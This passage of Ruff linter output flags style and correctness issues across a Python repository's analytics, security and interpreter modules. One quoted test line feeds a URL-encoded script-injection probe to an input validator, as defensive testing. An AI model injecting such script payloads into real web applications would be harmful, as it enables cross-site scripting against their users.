    |         ^^^^^^^^^^^^^
751 |     ) -> ClusterAnalysisResult:
752 |         """Perform DBSCAN clustering"""
    |

N806 Variable `X_scaled` in function should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:754:9
    |
752 |         """Perform DBSCAN clustering"""
753 |         scaler = StandardScaler()
754 |         X_scaled = scaler.fit_transform(X)
    |         ^^^^^^^^
755 |
756 |         dbscan = DBSCAN(eps=eps, min_samples=min_samples)
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
  --> engines\hydra_50\hydra_50_cli.py:85:9
   |
83 |     except Exception as e:
84 |         console.print(f"[red]Error:[/red] {str(e)}")
85 |         raise typer.Exit(code=1)
   |         ^^^^^^^^^^^^^^^^^^^^^^^^
   |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> engines\hydra_50\hydra_50_cli.py:117:9
    |
115 |     except Exception as e:
116 |         console.print(f"[red]Error:[/red] {str(e)}")
117 |         raise typer.Exit(code=1)
    |         ^^^^^^^^^^^^^^^^^^^^^^^^
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> engines\hydra_50\hydra_50_cli.py:139:9
    |
137 |     except Exception as e:
138 |         console.print(f"[red]Error:[/red] {str(e)}")
139 |         raise typer.Exit(code=1)
    |         ^^^^^^^^^^^^^^^^^^^^^^^^
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> engines\hydra_50\hydra_50_cli.py:170:9
    |
168 |     except Exception as e:
169 |         console.print(f"[red]Error:[/red] {str(e)}")
170 |         raise typer.Exit(code=1)
    |         ^^^^^^^^^^^^^^^^^^^^^^^^
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> engines\hydra_50\hydra_50_cli.py:207:9
    |
205 |     except Exception as e:
206 |         console.print(f"[red]Error:[/red] {str(e)}")
207 |         raise typer.Exit(code=1)
    |         ^^^^^^^^^^^^^^^^^^^^^^^^
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> engines\hydra_50\hydra_50_cli.py:247:9
    |
245 |     except Exception as e:
246 |         console.print(f"[red]Error:[/red] {str(e)}")
247 |         raise typer.Exit(code=1)
    |         ^^^^^^^^^^^^^^^^^^^^^^^^
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> engines\hydra_50\hydra_50_cli.py:272:9
    |
270 |     except Exception as e:
271 |         console.print(f"[red]Error:[/red] {str(e)}")
272 |         raise typer.Exit(code=1)
    |         ^^^^^^^^^^^^^^^^^^^^^^^^
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> engines\hydra_50\hydra_50_cli.py:293:9
    |
291 |     except Exception as e:
292 |         console.print(f"[red]Error:[/red] {str(e)}")
293 |         raise typer.Exit(code=1)
    |         ^^^^^^^^^^^^^^^^^^^^^^^^
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> engines\hydra_50\hydra_50_cli.py:346:9
    |
344 |     except Exception as e:
345 |         console.print(f"[red]Error:[/red] {str(e)}")
346 |         raise typer.Exit(code=1)
    |         ^^^^^^^^^^^^^^^^^^^^^^^^
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\hydra_50\hydra_50_engine.py:201:9
    |
199 |                       f"{self.variable_name} cannot exceed ceiling of {self.locked_value} (locked: {self.reason})",
200 |                   )
201 | /         elif self.constraint_type == "floor":
202 | |             if new_value < self.locked_value:
    | |_____________________________________________^
203 |                   return (
204 |                       False,
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> engines\hydra_50\hydra_50_engine.py:4497:13
     |
4495 |                           activated.append(target_id)
4496 |
4497 | /             elif coupling.coupling_type == "synchronizing":
4498 | |                 # Synchronize escalation levels
4499 | |                 if (
4500 | |                     target.escalation_level.value
4501 | |                     < source_scenario.escalation_level.value
4502 | |                 ):
     | |__________________^
4503 |                       target.escalation_level = EscalationLevel(
4504 |                           min(source_scenario.escalation_level.value, 5)
     |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> engines\hydra_50\hydra_50_engine.py:4828:9
     |
4826 |                   )
4827 |
4828 | /         elif scenario.category == ScenarioCategory.SOCIETAL:
4829 | |             # Social cohesion and legitimacy never fully recover
4830 | |             if (
4831 | |                 "legitimacy_collapse" in triggered_collapses
4832 | |                 or "social_fracture" in triggered_collapses
4833 | |             ):
     | |______________^
4834 |                   constraints.append(
4835 |                       VariableConstraint(
     |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> engines\hydra_50\hydra_50_engine.py:4897:9
     |
4895 |                   )
4896 |
4897 | /         elif scenario.category == ScenarioCategory.SOCIETAL:
4898 | |             if "legitimacy_collapse" in triggered_collapses:
     | |____________________________________________________________^
4899 |                   disabled.append(
4900 |                       DisabledRecoveryEvent(
     |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\hydra_50\hydra_50_visualization.py:364:13
    |
363 |           while True:
364 | /             if 0 <= x0 < len(canvas[0]) and 0 <= y0 < len(canvas):
365 | |                 if canvas[y0][x0] == " ":
    | |_________________________________________^
366 |                       canvas[y0][x0] = char
    |
help: Combine `if` statements using `and`

F841 Local variable `actions` is assigned to but never used
  --> engines\hydra_50\hydra_incident_response.py:56:9
   |
55 |         # 2. Analyze and Deploy Countermeasures
56 |         actions = self._deploy_countermeasures(incident)
   |         ^^^^^^^
57 |
58 |         return incident_id
   |
help: Remove assignment to unused variable `actions`

B008 Do not perform function call `Body` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
  --> engines\sovereign_war_room\swr\api.py:83:58
   |
82 | @app.post("/scenarios/load")
83 | async def load_scenarios(request: LoadScenariosRequest = Body(...)):
   |                                                          ^^^^^^^^^
84 |     """
85 |     Load scenarios for testing.
   |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> engines\sovereign_war_room\swr\api.py:111:9
    |
109 |         }
110 |     except Exception as e:
111 |         raise HTTPException(status_code=400, detail=str(e))
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> engines\sovereign_war_room\swr\api.py:157:9
    |
155 |         return result
156 |     except Exception as e:
157 |         raise HTTPException(status_code=500, detail=str(e))
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> engines\sovereign_war_room\swr\api.py:307:9
    |
305 |         return {"success": True, "filepath": filepath, "format": format}
306 |     except Exception as e:
307 |         raise HTTPException(status_code=500, detail=str(e))
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |

SIM103 Return the negated condition directly
   --> engines\sovereign_war_room\swr\crypto.py:167:13
    |
166 |               # Verify signature
167 | /             if not self._verify_signature(proof_hash, signature):
168 | |                 return False
169 | |
170 | |             # Note: Full ZK proof verification would require the original timestamp
171 | |             # For production, store proofs with metadata in a merkle tree
172 | |             return True
    | |_______________________^
173 |
174 |           except Exception:
    |
help: Inline condition

SIM116 Use a dictionary instead of consecutive `if` statements
   --> engines\sovereign_war_room\swr\governance.py:310:9
    |
308 |               return False
309 |
310 | /         if operator == "==":
311 | |             return value == expected
312 | |         elif operator == "!=":
313 | |             return value != expected
314 | |         elif operator == ">":
315 | |             return value > expected
316 | |         elif operator == ">=":
317 | |             return value >= expected
318 | |         elif operator == "<":
319 | |             return value < expected
320 | |         elif operator == "<=":
321 | |             return value <= expected
322 | |         elif operator == "in":
323 | |             return value in expected
324 | |         elif operator == "not_in":
325 | |             return value not in expected
    | |________________________________________^
326 |
327 |           return False
    |

E402 Module level import not at top of file
  --> examples\temporal\code_security_sweep_example.py:18:1
   |
16 | sys.path.insert(0, str(project_root))
17 |
18 | from temporalio.client import Client
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
19 |
20 | from temporal.workflows.security_agent_workflows import (
   |

E402 Module level import not at top of file
  --> examples\temporal\code_security_sweep_example.py:20:1
   |
18 |   from temporalio.client import Client
19 |
20 | / from temporal.workflows.security_agent_workflows import (
21 | |     CodeSecuritySweepRequest,
22 | |     CodeSecuritySweepWorkflow,
23 | | )
   | |_^
24 |
25 |   logging.basicConfig(level=logging.INFO)
   |

E402 Module level import not at top of file
  --> examples\temporal\red_team_campaign_example.py:18:1
   |
16 | sys.path.insert(0, str(project_root))
17 |
18 | from temporalio.client import Client
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
19 |
20 | from temporal.workflows.security_agent_workflows import (
   |

E402 Module level import not at top of file
  --> examples\temporal\red_team_campaign_example.py:20:1
   |
18 |   from temporalio.client import Client
19 |
20 | / from temporal.workflows.security_agent_workflows import (
21 | |     RedTeamCampaignRequest,
22 | |     RedTeamCampaignWorkflow,
23 | | )
   | |_^
24 |
25 |   logging.basicConfig(level=logging.INFO)
   |

E402 Module level import not at top of file
  --> examples\tseca_ghost_examples.py:22:1
   |
20 |   sys.path.insert(0, str(project_root))
21 |
22 | / from src.app.security.tseca_ghost_protocol import (
23 | |     TSECA,
24 | |     GhostProtocol,
25 | |     HeartbeatMonitor,
26 | |     TSECA_Ghost_System,
27 | |     shamir_reconstruct,
28 | |     shamir_split,
29 | | )
   | |_^
30 |
31 |   # Configure logging
   |

F541 [*] f-string without any placeholders
  --> external\Cerberus\demo_security.py:46:11
   |
45 |     hub = HubCoordinator(max_guardians=15)
46 |     print(f"Γ£ô Hub initialized with max_guardians=15")
   |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
47 |
48 |     print("\n1. First attack - should spawn guardians:")
   |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
  --> external\Cerberus\demo_security.py:68:11
   |
67 |     hub = HubCoordinator(max_guardians=20)
68 |     print(f"Γ£ô Hub initialized")
   |           ^^^^^^^^^^^^^^^^^^^^
69 |     print(f"  Per-source limit: {settings.per_source_rate_limit_per_minute}/minute")
   |
help: Remove extraneous `f` prefix

F841 Local variable `result` is assigned to but never used
  --> external\Cerberus\demo_security.py:80:5
   |
78 |     time.sleep(settings.spawn_cooldown_seconds + 0.05)
79 |     prev_count = hub.guardian_count
80 |     result = hub.analyze("Attack from source 2", source_id="another_actor")
   |     ^^^^^^
81 |     print(f"   Guardians: {prev_count} ΓåÆ {hub.guardian_count} (independent tracking)")
   |
help: Remove assignment to unused variable `result`

F541 [*] f-string without any placeholders
  --> external\Cerberus\demo_security.py:89:11
   |
88 |     hub = HubCoordinator(max_guardians=6)
89 |     print(f"Γ£ô Hub initialized with max_guardians=6")
   |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
90 |     print(f"  Initial guardians: {hub.guardian_count}")
   |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
   --> external\Cerberus\demo_security.py:101:15
    |
 99 |         print(f"   Decision: {result['decision']}")
100 |         print(f"   Reason: {result['reason']}")
101 |         print(f"   ΓÜá∩╕Å  System protection activated!")
    |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |
help: Remove extraneous `f` prefix

E402 Module level import not at top of file
  --> external\Cerberus\src\cerberus\__init__.py:20:1
   |
19 | # Auto-configure logging for convenience (but can be disabled by setting env var)
20 | import os
   | ^^^^^^^^^
21 |
22 | if os.environ.get("CERBERUS_AUTO_CONFIGURE_LOGGING", "true").lower() != "false":
   |

F401 [*] `cerberus.guardians.base.ThreatReport` imported but unused
  --> external\Cerberus\src\cerberus\hub\coordinator.py:13:64
   |
12 | from cerberus.config import settings
13 | from cerberus.guardians.base import BaseGuardian, ThreatLevel, ThreatReport
   |                                                                ^^^^^^^^^^^^
14 | from cerberus.guardians.heuristic import HeuristicGuardian
15 | from cerberus.guardians.pattern import PatternGuardian
   |
help: Remove unused import: `cerberus.guardians.base.ThreatReport`

F821 Undefined name `GuardianResult`
   --> external\Cerberus\src\cerberus\hub\coordinator.py:279:23
    |
277 |             }
278 |
279 |         results: list[GuardianResult] = []
    |                       ^^^^^^^^^^^^^^
280 |         bypass_detected = False
    |

E501 Line too long (101 > 100)
   --> external\Cerberus\src\cerberus\security\modules\auth.py:436:101
    |
434 |             return (
435 |                 False,
436 |                 f"Cannot reuse any of the last {self.password_policy.prevent_reuse_count} passwords",
    |                                                                                                     ^
437 |             )
    |

E501 Line too long (118 > 100)
   --> external\Cerberus\src\cerberus\security\modules\monitoring.py:311:101
    |
309 |                     severity=AlertSeverity.WARNING,
310 |                     title=f"Anomaly detected in {metric_name}",
311 |                     description=f"Value {latest:.2f} deviates {z_score:.2f} standard deviations from mean {mean:.2f}",
    |                                                                                                     ^^^^^^^^^^^^^^^^^^
312 |                     category="anomaly",
313 |                     source="security_monitor",
    |

N818 Exception name `RateLimitExceeded` should be named with an Error suffix
   --> external\Cerberus\src\cerberus\security\modules\rate_limiter.py:368:7
    |
368 | class RateLimitExceeded(Exception):
    |       ^^^^^^^^^^^^^^^^^
369 |     """Exception raised when rate limit is exceeded"""
    |

N818 Exception name `PermissionDenied` should be named with an Error suffix
   --> external\Cerberus\src\cerberus\security\modules\rbac.py:372:7
    |
372 | class PermissionDenied(Exception):
    |       ^^^^^^^^^^^^^^^^
373 |     """Exception raised when permission is denied"""
    |

N818 Exception name `SandboxViolation` should be named with an Error suffix
  --> external\Cerberus\src\cerberus\security\modules\sandbox.py:36:7
   |
36 | class SandboxViolation(Exception):
   |       ^^^^^^^^^^^^^^^^
37 |     """Exception raised when sandbox limits are violated"""
   |

E501 Line too long (123 > 100)
 --> external\Cerberus\tests\security\test_all_modules.py:3:101
  |
1 | """
2 | Comprehensive security module tests
3 | Tests for input validation, audit logging, rate limiting, RBAC, encryption, auth, sandbox, threat detection, and monitoring
  |                                                                                                     ^^^^^^^^^^^^^^^^^^^^^^^
4 | """
  |

F841 Local variable `result` is assigned to but never used
   --> external\Cerberus\tests\security\test_all_modules.py:249:9
    |
248 |         # Should detect DoS pattern
249 |         result = detector.detect("another request", "attacker_ip")
    |         ^^^^^^
250 |         # Behavioral detection may or may not trigger depending on timing
    |
help: Remove assignment to unused variable `result`

F841 Local variable `result` is assigned to but never used
   --> external\Cerberus\tests\security\test_all_modules.py:298:9
    |
296 |         """Test URL-encoded attack"""
297 |         validator = InputValidator()
298 |         result = validator.validate("%3Cscript%3Ealert(1)%3C/script%3E")
    |         ^^^^^^
299 |         # Note: This test may need URL decoding in production
    |
help: Remove assignment to unused variable `result`

F401 [*] `io.StringIO` imported but unused
 --> external\Cerberus\tests\test_logging_config.py:6:16
  |
4 | import logging
5 | import sys
6 | from io import StringIO
  |                ^^^^^^^^
7 |
8 | import pytest
  |
help: Remove unused import: `io.StringIO`

E402 Module level import not at top of file
  --> external\Thirsty-Lang\src\security\tarl_bridge_server.py:17:1
   |
15 | sys.path.insert(0, str(tarl_path.parent))
16 |
17 | from tarl import TarlDecision, TarlPolicy, TarlRuntime, TarlVerdict
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP015 [*] Unnecessary mode argument
   --> external\Thirsty-Lang\src\security\tarl_bridge_server.py:98:32
    |
 97 |         # Load policies from JSON/YAML
 98 |         with open(policy_path, "r") as f:
    |                                ^^^
 99 |             if policy_path.endswith(".json"):
100 |                 policy_data = json.load(f)
    |
help: Remove mode argument

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirsty-Lang\src\thirsty_interpreter.py:9:1
  |
7 | import re
8 | import sys
9 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirsty-Lang\src\thirsty_interpreter.py:9:1
  |
7 | import re
8 | import sys
9 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

F401 [*] `typing.Optional` imported but unused
 --> external\Thirsty-Lang\src\thirsty_interpreter.py:9:37
  |
7 | import re
8 | import sys
9 | from typing import Any, Dict, List, Optional
  |                                     ^^^^^^^^
  |
help: Remove unused import: `typing.Optional`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirsty-Lang\src\thirsty_interpreter.py:16:25
   |
15 |     def __init__(self):
16 |         self.variables: Dict[str, Any] = {}
   |                         ^^^^
17 |         self.output: List[str] = []
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirsty-Lang\src\thirsty_interpreter.py:17:22
   |
15 |     def __init__(self):
16 |         self.variables: Dict[str, Any] = {}
17 |         self.output: List[str] = []
   |                      ^^^^
18 |
19 |     def interpret(self, code: str) -> List[str]:
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirsty-Lang\src\thirsty_interpreter.py:19:39
   |
17 |         self.output: List[str] = []
18 |
19 |     def interpret(self, code: str) -> List[str]:
   |                                       ^^^^
20 |         """
21 |         Interpret Thirsty-lang code and return output
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirsty-Lang\src\thirsty_interpreter.py:114:32
    |
112 |         return expr
113 |
114 |     def get_variables(self) -> Dict[str, Any]:
    |                                ^^^^
115 |         """Return current variable state"""
116 |         return self.variables.copy()
    |
help: Replace with `dict`

UP015 [*] Unnecessary mode argument
   --> external\Thirsty-Lang\src\thirsty_interpreter.py:122:29
    |
120 |     """Run a Thirsty-lang file"""
121 |     try:
122 |         with open(filename, "r", encoding="utf-8") as f:
    |                             ^^^
123 |             code = f.read()
    |
help: Remove mode argument

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirsty-Lang\src\thirsty_utils.py:9:1
  |
7 | import os
8 | import sys
9 | from typing import List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP015 [*] Unnecessary mode argument
  --> external\Thirsty-Lang\src\thirsty_utils.py:25:25
   |
23 |         FileNotFoundError: If file doesn't exist
24 |     """
25 |     with open(filename, "r", encoding="utf-8") as f:
   |                         ^^^
26 |         return f.read()
   |
help: Remove mode argument

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirsty-Lang\src\thirsty_utils.py:56:43
   |
56 | def find_thirsty_files(directory: str) -> List[str]:
   |                                           ^^^^
57 |     """
58 |     Find all Thirsty-lang files in a directory
   |
help: Replace with `list`

B007 Loop control variable `dirs` not used within loop body
  --> external\Thirsty-Lang\src\thirsty_utils.py:67:15
   |
65 |     """
66 |     thirsty_files = []
67 |     for root, dirs, files in os.walk(directory):
   |               ^^^^
68 |         for file in files:
69 |             filepath = os.path.join(root, file)
   |
help: Rename unused `dirs` to `_dirs`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirsty-Lang\src\thirsty_utils.py:75:42
   |
75 | def format_error(message: str, line_num: Optional[int] = None) -> str:
   |                                          ^^^^^^^^^^^^^
76 |     """
77 |     Format an error message
   |
help: Convert to `X | None`

UP015 [*] Unnecessary mode argument
 --> external\Thirstys-Monolith\setup.py:5:24
  |
3 | from setuptools import find_packages, setup
4 |
5 | with open("README.md", "r", encoding="utf-8") as fh:
  |                        ^^^
6 |     long_description = fh.read()
  |
help: Remove mode argument

UP015 [*] Unnecessary mode argument
  --> external\Thirstys-Monolith\setup.py:8:31
   |
 6 |     long_description = fh.read()
 7 |
 8 | with open("requirements.txt", "r", encoding="utf-8") as fh:
   |                               ^^^
 9 |     requirements = [
10 |         line.strip() for line in fh if line.strip() and not line.startswith("#")
   |
help: Remove mode argument

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Monolith\src\app\agents\codex_deus_maximus.py:14:1
   |
12 | import types
13 | from datetime import datetime, timezone
14 | from typing import Any, Dict, List
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
15 |
16 | # --- CONFIGURATION ---
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> external\Thirstys-Monolith\src\app\agents\codex_deus_maximus.py:14:1
   |
12 | import types
13 | from datetime import datetime, timezone
14 | from typing import Any, Dict, List
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
15 |
16 | # --- CONFIGURATION ---
   |

F401 [*] `typing.List` imported but unused
  --> external\Thirstys-Monolith\src\app\agents\codex_deus_maximus.py:14:31
   |
12 | import types
13 | from datetime import datetime, timezone
14 | from typing import Any, Dict, List
   |                               ^^^^
15 |
16 | # --- CONFIGURATION ---
   |
help: Remove unused import: `typing.List`

SIM105 Use `contextlib.suppress(Exception)` instead of `try`-`except`-`pass`
  --> external\Thirstys-Monolith\src\app\agents\codex_deus_maximus.py:34:9
   |
32 |           self.audit_path = os.path.join(self.data_dir, "schematic_audit.json")
33 |           # Ensure legacy method binding for compatibility
34 | /         try:
35 | |             self.auto_fix_file = types.MethodType(self.__class__.auto_fix_file, self)
36 | |         except Exception:
37 | |             pass
   | |________________^
38 |
39 |       def initialize(self) -> bool:
   |
help: Replace `try`-`except`-`pass` with `with contextlib.suppress(Exception): ...`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Monolith\src\app\agents\codex_deus_maximus.py:43:44
   |
41 |         return True
42 |
43 |     def _audit(self, action: str, details: Dict[str, Any]) -> None:
   |                                            ^^^^
44 |         """Log actions to the audit trail."""
45 |         try:
   |
help: Replace with `dict`

UP017 [*] Use `datetime.UTC` alias
  --> external\Thirstys-Monolith\src\app\agents\codex_deus_maximus.py:48:36
   |
46 |             os.makedirs(os.path.dirname(self.audit_path), exist_ok=True)
47 |             entry = {
48 |                 "ts": datetime.now(timezone.utc).isoformat(),
   |                                    ^^^^^^^^^^^^
49 |                 "action": action,
50 |                 "details": details,
   |
help: Convert to `datetime.UTC` alias

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Monolith\src\app\agents\codex_deus_maximus.py:57:69
   |
55 |             logger.error("Failed to write audit entry.")
56 |
57 |     def run_schematic_enforcement(self, root: str | None = None) -> Dict[str, Any]:
   |                                                                     ^^^^
58 |         """The Main Routine: Validates structure and fixes files."""
59 |         root = root or os.getcwd()
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Monolith\src\app\agents\codex_deus_maximus.py:96:49
   |
94 |         return report
95 |
96 |     def _validate_structure(self, root: str) -> Dict[str, Any]:
   |                                                 ^^^^
97 |         """Ensure the repository adheres to the required folder schematic."""
98 |         missing = []
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Monolith\src\app\agents\codex_deus_maximus.py:109:43
    |
107 |         return {"status": status, "missing_directories": missing}
108 |
109 |     def auto_fix_file(self, path: str) -> Dict[str, Any]:
    |                                           ^^^^
110 |         """Strictly enforces formatting standards (Tabs->Spaces, EOF Newline, Syntax Check)."""
111 |         if not os.path.exists(path):
    |
help: Replace with `dict`

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> external\Thirstys-Monolith\src\monolith\health.py:21:1
   |
19 | import time
20 | from http.server import BaseHTTPRequestHandler, HTTPServer
21 | from typing import Callable
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |
help: Import from `collections.abc`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Monolith\src\monolith\ipc.py:6:1
  |
4 | from enum import Enum, auto
5 | from multiprocessing import Queue
6 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 |
8 | from .errors import IPCError
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Monolith\src\monolith\ipc.py:21:14
   |
19 | class Message:
20 |     type: MessageType
21 |     payload: Dict[str, Any]
   |              ^^^^
   |
help: Replace with `dict`

UP037 [*] Remove quotes from type annotation
  --> external\Thirstys-Monolith\src\monolith\ipc.py:24:17
   |
24 | def send(queue: "Queue[Message]", msg: Message, timeout: float = 5.0) -> None:
   |                 ^^^^^^^^^^^^^^^^
25 |     """Put a message onto a queue.
   |
help: Remove quotes

UP037 [*] Remove quotes from type annotation
  --> external\Thirstys-Monolith\src\monolith\ipc.py:41:17
   |
41 | def recv(queue: "Queue[Message]", timeout: float | None = None) -> Message:
   |                 ^^^^^^^^^^^^^^^^
42 |     """Get a message from a queue.
   |
help: Remove quotes

UP035 [*] Import from `collections.abc` instead: `MutableMapping`
  --> external\Thirstys-Monolith\src\monolith\logging.py:19:1
   |
17 | import os
18 | import time
19 | from typing import Any, MutableMapping
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |
help: Import from `collections.abc`

F401 [*] `typing.MutableMapping` imported but unused
  --> external\Thirstys-Monolith\src\monolith\logging.py:19:25
   |
17 | import os
18 | import time
19 | from typing import Any, MutableMapping
   |                         ^^^^^^^^^^^^^^
   |
help: Remove unused import: `typing.MutableMapping`

F401 [*] `dataclasses.field` imported but unused
 --> external\Thirstys-Monolith\src\monolith\memory.py:3:36
  |
1 | from __future__ import annotations
2 |
3 | from dataclasses import dataclass, field
  |                                    ^^^^^
4 | from typing import Dict
  |
help: Remove unused import: `dataclasses.field`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Monolith\src\monolith\memory.py:4:1
  |
3 | from dataclasses import dataclass, field
4 | from typing import Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^
5 |
6 | from .errors import MemoryErrorLogical
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Monolith\src\monolith\memory.py:33:24
   |
31 |         self._max_bytes = max_bytes
32 |         self._used_bytes = 0
33 |         self._regions: Dict[str, Region] = {}
   |                        ^^^^
34 |         self._storage: Dict[str, bytearray] = {}
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Monolith\src\monolith\memory.py:34:24
   |
32 |         self._used_bytes = 0
33 |         self._regions: Dict[str, Region] = {}
34 |         self._storage: Dict[str, bytearray] = {}
   |                        ^^^^
35 |
36 |     # ------------------------------------------------------------------
   |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Monolith\src\monolith\metrics.py:25:1
   |
23 | from dataclasses import dataclass, field
24 | from http.server import BaseHTTPRequestHandler, HTTPServer
25 | from typing import Dict
   | ^^^^^^^^^^^^^^^^^^^^^^^
   |

F401 [*] `typing.Dict` imported but unused
  --> external\Thirstys-Monolith\src\monolith\metrics.py:25:20
   |
23 | from dataclasses import dataclass, field
24 | from http.server import BaseHTTPRequestHandler, HTTPServer
25 | from typing import Dict
   |                    ^^^^
   |
help: Remove unused import: `typing.Dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Monolith\src\monolith\models.py:7:1
  |
5 | from dataclasses import dataclass, field
6 | from enum import Enum, auto
7 | from typing import Any, Dict, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Monolith\src\monolith\models.py:25:15
   |
23 |     priority: int = 0  # higher = sooner
24 |     created_at: float = field(default_factory=time.time)
25 |     deadline: Optional[float] = None  # epoch seconds
   |               ^^^^^^^^^^^^^^^
26 |     labels: Dict[str, str] = field(default_factory=dict)
27 |     resource_hints: Dict[str, Any] = field(default_factory=dict)
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Monolith\src\monolith\models.py:26:13
   |
24 |     created_at: float = field(default_factory=time.time)
25 |     deadline: Optional[float] = None  # epoch seconds
26 |     labels: Dict[str, str] = field(default_factory=dict)
   |             ^^^^
27 |     resource_hints: Dict[str, Any] = field(default_factory=dict)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Monolith\src\monolith\models.py:27:21
   |
25 |     deadline: Optional[float] = None  # epoch seconds
26 |     labels: Dict[str, str] = field(default_factory=dict)
27 |     resource_hints: Dict[str, Any] = field(default_factory=dict)
   |                     ^^^^
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Monolith\src\monolith\models.py:33:14
   |
31 | class Task:
32 |     meta: TaskMetadata
33 |     payload: Dict[str, Any]  # Thirsty-Lang / Waterfall IR fragment
   |              ^^^^
34 |     state: TaskState = TaskState.PENDING
35 |     last_error: Optional[str] = None
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Monolith\src\monolith\models.py:35:17
   |
33 |     payload: Dict[str, Any]  # Thirsty-Lang / Waterfall IR fragment
34 |     state: TaskState = TaskState.PENDING
35 |     last_error: Optional[str] = None
   |                 ^^^^^^^^^^^^^
   |
help: Convert to `X | None`

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Monolith\src\monolith\scheduler.py:5:1
  |
3 | import time
4 | from multiprocessing import Queue
5 | from typing import List
